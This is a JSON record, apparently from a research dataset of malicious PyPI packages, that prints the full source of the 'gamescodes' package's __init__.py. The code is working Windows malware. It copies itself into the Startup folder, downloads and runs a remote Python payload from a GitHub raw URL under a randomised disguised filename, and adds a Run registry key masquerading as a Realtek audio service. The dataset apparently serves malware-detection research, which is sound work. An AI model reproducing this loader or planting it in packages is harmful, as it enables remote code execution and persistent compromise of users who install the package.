[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/gamescodes-1.2-py3-none-any/gamescodes/__init__.py",
    "malicious_code": "from sys import executable\nfrom urllib import request\nfrom os import getenv, system, name, listdir, startfile\nfrom os.path import isfile\nimport winreg\nfrom random import choice\nfrom shutil import copy\n\npath = \"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Update.pyw\" % getenv(\"userprofile\")\nif not isfile(path):\n    copy(__file__, path)\n    startfile(path)\n    exit()\nelif __file__.replace('\\\\', '/') != path.replace('\\\\', '/'):\n    exit()\n\nif name != 'nt': \n    exit()\n\ndef getPath():\n    path = choice([getenv(\"APPDATA\"), getenv(\"LOCALAPPDATA\")])\n    directory = listdir(path)\n    for _ in range(10):\n        chosen = choice(directory)\n        ye = path + \"\\\\\" + chosen\n        if not isfile(ye) and \" \" not in chosen:\n            return ye\n    return getenv(\"TEMP\")\n\ndef getName():\n    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))\n    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']\n    return firstName + choice(lasName)\n\n\ndef install(path):\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(request.urlopen(\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\").read().decode(\"utf8\"))\n\ndef run(path):\n    system(f\"start {executable} {path}\")\n\ndef startUP(path):\n    faked = 'SecurityHealthSystray.exe'\n    address = f\"{executable} {path}\"\n    key1 = winreg.HKEY_CURRENT_USER\n    key2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)\n    winreg.SetValueEx(open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\")\n\nDoYouKnowTheWay = getPath() + '\\\\' + getName()\ninstall(DoYouKnowTheWay)\nrun(DoYouKnowTheWay)\ntry:\n    startUP(DoYouKnowTheWay)\nexcept:\n    pass"
  }
]